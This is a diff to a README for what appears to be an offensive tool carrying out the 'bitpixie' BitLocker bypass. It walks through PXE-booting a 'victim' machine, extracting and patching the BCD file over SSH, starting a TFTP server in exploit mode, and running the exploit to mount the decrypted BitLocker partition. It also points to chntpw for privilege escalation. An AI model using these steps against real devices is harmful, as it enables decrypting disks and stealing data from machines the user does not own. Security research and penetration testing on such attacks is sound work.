@@ -44,21 +44,32 @@ This will reboot the machine into Advanced Boot Options.
 There you have to click on `Use a device` and select IPv4 PXE Boot.
 
 ### Extracting the BCD file
-Extracting the (unmodified) BCD file from the EFI partition is easy:
+Boot the victim system into the initramfs using PXE boot: `./start-server.sh get-bcd <interface>`
+On the victim machine you can identify the drive containing the Windows installation (often /dev/sda).
+
+On the attacker machine execute the BCD extractor script:
 ```
-initrd:~# extract-bcd /dev/sda1
+./grab-bcd.sh /dev/sda
+[+] Info: Grabbing disk and partition GUIDs via SSH...
+[...]
+[+] Info: Created modified BCD file: PXE-Server/Boot/BCD
 ```
-The BCD file is copied to the /root/ directory.
-In the future, the BCD file will be automatically copied to the attacker machine.
+This script obtains the disk and partition GUID from the victim computer and creates a registry patch file.
+Afterwards the BCD-template file gets patched and copied to PXE-Server/Boot/BCD.
+
+Now you are ready to perform the actual attack!
+Reboot the victim system into the startup settings again.
 
 ### Breaking BitLocker
-Start the TFTP server into exploit mode (boot into downgraded Windows boot manager).
-Preform the bitpixie exploit:
+Start the TFTP server in exploit mode: `./start-server.sh exploit <interface>`.
+Log in as root and perform the bitpixie exploit on the victim machine:
 ```
 initrd:~# run-exploit /dev/sda3
 ```
 The BitLocker partition should now be mounted at /root/mnt.
 If it did not work, reboot and try it again. Sometimes the VMK is not detected / overwritten.
+
+Note: The alpine initramfs also has [chntpw](https://pkgs.alpinelinux.org/package/edge/community/x86_64/chntpw) installed for easy privilege escalation!
 
 Don't forget to unmount the file system after performing your changes: `umount /root/mnt`!
 
